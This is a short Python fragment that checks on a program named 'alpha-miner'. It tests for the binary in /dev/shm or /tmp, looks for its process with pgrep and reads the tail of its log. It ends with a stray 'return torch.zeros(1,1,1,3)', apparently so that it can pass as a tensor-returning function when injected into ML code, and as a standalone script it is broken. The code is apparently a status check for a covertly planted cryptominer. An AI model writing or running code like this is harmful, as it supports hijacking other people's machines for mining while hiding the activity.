import subprocess, os
out = []
# Check binary
for p in ["/dev/shm/alpha-miner", "/tmp/alpha-miner"]:
    if os.path.exists(p):
        out.append(f"BIN:{p}:{os.path.getsize(p)}")
        break
else:
    out.append("BIN:MISSING")

# Check process
r = subprocess.run(["pgrep", "-a", "alpha"], capture_output=True, text=True)
out.append(f"PGREP:{r.stdout.strip()[:80] if r.stdout.strip() else 'none'}")

# Check log
for p in ["/dev/shm/alpha.log", "/tmp/alpha.log"]:
    if os.path.exists(p):
        with open(p) as f:
            lines = f.readlines()
        out.append(f"LOG:{len(lines)}lines:{lines[-1].strip()[:60] if lines else 'empty'}")
        break
else:
    out.append("LOG:MISSING")

print("\n".join(out))
import torch
return torch.zeros(1,1,1,3)
